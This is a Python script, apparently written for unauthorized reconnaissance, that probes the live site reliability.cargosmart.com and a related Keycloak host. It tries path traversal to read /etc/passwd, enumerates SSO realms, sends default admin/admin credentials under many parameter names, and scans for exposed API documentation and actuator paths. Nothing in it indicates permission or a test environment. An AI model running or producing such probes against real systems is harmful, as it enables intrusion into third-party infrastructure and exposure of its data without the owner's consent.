import urllib.request
import ssl
import json

ctx = ssl.create_default_context()
base = 'https://reliability.cargosmart.com'

def api_test(path, data=None, method='POST', headers=None, raw=False):
    url = base + path
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64)')
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    if data and isinstance(data, bytes):
        if not headers or all(k.lower() != 'content-type' for k in headers or {}):
            req.add_header('Content-Type', 'application/json')
    try:
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        body = resp.read()
        if raw:
            return (resp.status, body, resp.headers)
        return (resp.status, body, dict(resp.headers))
    except urllib.error.HTTPError as e:
        body = e.read() if e.fp else b''
        if raw:
            return (e.code, body, e.headers)
        return (e.code, body, dict(e.headers))
    except Exception as e:
        return (None, str(e).encode(), {})

print('=== 1. Investigate /api/pp-reliability/get-all more carefully ===')
result = api_test('/api/pp-reliability/get-all', data=json.dumps({}).encode())
status, body, headers = result
print(f'Status: {status}')
print(f'Headers:')
for k, v in headers.items():
    print(f'  {k}: {v}')
try:
    j = json.loads(body)
    print(f'\nBody (JSON): {json.dumps(j, indent=2, ensure_ascii=False)}')
except:
    print(f'\nBody: {body.decode()[:500]}')

print('\n=== 2. Check the /api/rawdata/download/port-pair response ===')
result = api_test('/api/rawdata/download/port-pair?file=../etc/passwd',
                  headers={'Accept': '*/*'}, method='GET')
status, body, headers = result
print(f'Status: {status}')
if status == 200:
    print(f'Content-Type: {headers.get("Content-Type", "N/A")}')
    print(f'Content-Length: {headers.get("Content-Length", len(body))}')
    try:
        print(f'Body: {body.decode("utf-8", errors="replace")[:500]}')
    except:
        print(f'Body (hex): {body[:200].hex()}')
elif status:
    print(f'Body: {body.decode("utf-8", errors="replace")[:200]}')

print('\n=== 3. Check if there are other realms in Keycloak (for SSO tokens) ===')
# Try to find other realms
for realm in ['master', 'cargosmart', 'oocl', 'Schedulingsmart', 'reliability',
              'cpm', 'DMS', 'depot', 'scheduling', 'app', 'application']:
    try:
        url = f'https://iamfw.home.oocllogistics.com/auth/realms/{realm}'
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        body = resp.read()
        j = json.loads(body)
        print(f'  Realm "{realm}": EXISTS! Public key: {j.get("public_key", "N/A")[:40]}...')
    except urllib.error.HTTPError as e:
        if e.code == 404:
            pass  # Realm doesn't exist
        else:
            print(f'  Realm "{realm}": HTTP {e.code}')
    except Exception:
        pass

print('\n=== 4. Test /api/login with different content types ===')
for ct in ['application/x-www-form-urlencoded', 'text/plain', 'application/json']:
    data = 'username=admin&password=admin' if ct == 'application/x-www-form-urlencoded' else 'test'
    if ct == 'application/json':
        data = json.dumps({'username': 'admin', 'password': 'admin'})
    result = api_test('/api/login', data=data.encode(), method='POST',
                      headers={'Content-Type': ct})
    status, body, _ = result
    print(f'  Content-Type: {ct} -> HTTP {status}, {body.decode()[:80]}')

print('\n=== 5. Test /api/login with various parameter names ===')
for params in [
    {'username': 'admin', 'password': 'admin'},
    {'user': 'admin', 'pass': 'admin'},
    {'userId': 'admin', 'password': 'admin'},
    {'email': 'admin@test.com', 'password': 'admin'},
    {'token': 'test'},
    {'login': 'admin', 'pwd': 'admin'},
    {'name': 'admin', 'key': 'admin'},
]:
    result = api_test('/api/login', data=json.dumps(params).encode(), method='POST')
    status, body, _ = result
    if 'Token invalid' not in body.decode():
        print(f'  Params {params}: HTTP {status}, {body.decode()[:100]}')

print('\n=== 6. Explore the /api/port-raw-data/get-all endpoint ===')
result = api_test('/api/port-raw-data/get-all', data=json.dumps({}).encode())
status, body, _ = result
print(f'  HTTP {status}')
try:
    j = json.loads(body)
    print(f'  JSON: {json.dumps(j, ensure_ascii=False)[:500]}')
except:
    print(f'  Body: {body.decode()[:200]}')

print('\n=== 7. Check if there are any other accessible paths on the server ===')
common_paths = [
    '/css/app.9bbf1600.css',
    '/js/app.019dab37.js',
    '/favicon.ico',
    '/robots.txt',
    '/sitemap.xml',
    '/api/swagger.json',
    '/api-docs',
    '/.well-known/security.txt',
    '/version',
    '/actuator/health',
]
for p in common_paths:
    result = api_test(p, method='GET')
    if result[0] and result[0] != 404:
        print(f'  GET {p}: HTTP {result[0]} ({len(result[1])} bytes)')
